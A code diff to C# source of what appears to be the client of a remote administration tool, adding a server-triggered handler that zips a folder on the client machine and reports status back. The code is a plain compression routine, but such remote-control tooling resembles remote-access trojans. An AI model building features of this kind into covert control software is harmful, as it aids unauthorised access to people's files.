@@ -5,7 +5,8 @@ using System.Threading;
 using Microsoft.Win32;
 using xClient.Config;
 using xClient.Core.Helper;
-
+using ZipStorer = xClient.Core.Compression.ZipStorer;
+using System.Windows.Forms;
 namespace xClient.Core.Commands
 {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE DIRECTORIES AND FILES (excluding the program). */
@@ -238,6 +239,38 @@ namespace xClient.Core.Commands
             }
             catch
             {
+            }
+        }
+        public static void HandleZipFolder(Packets.ServerPackets.ZipFile command, Client client)
+        {
+            try
+            {
+                DirectoryInfo currentDir = new DirectoryInfo(command.RemotePath);
+                string zipName = currentDir.Parent.FullName + @"\" + currentDir.Name + ".zip";
+                //MessageBox.Show(zipName);
+                // Will close/update the zip file before disposing.
+                using (ZipStorer folderZipper = ZipStorer.Create(zipName, "Zipped file for: " + command.RemotePath))
+                {
+                    
+                    foreach (FileInfo file in currentDir.GetFiles())
+                    {
+                        try
+                        {
+                            folderZipper.AddFile(ZipStorer.Compression.Deflate, file.FullName, file.Name, file.Attributes.ToString());
+                        }
+                        catch (Exception ex)
+                        {
+                            new Core.Packets.ClientPackets.Status(string.Format("Error adding file to ZIP: {0}", ex.Message)).Execute(client);
+                        }
+                    }
+                }
+
+                if (File.Exists(zipName))
+                    HandleDirectory(new Packets.ServerPackets.Directory(Path.GetDirectoryName(currentDir.FullName)), client);
+            }
+            catch (Exception ex)
+            {
+                new Core.Packets.ClientPackets.Status(string.Format("Error zipping: {0}", ex.Message)).Execute(client);
             }
         }
     }
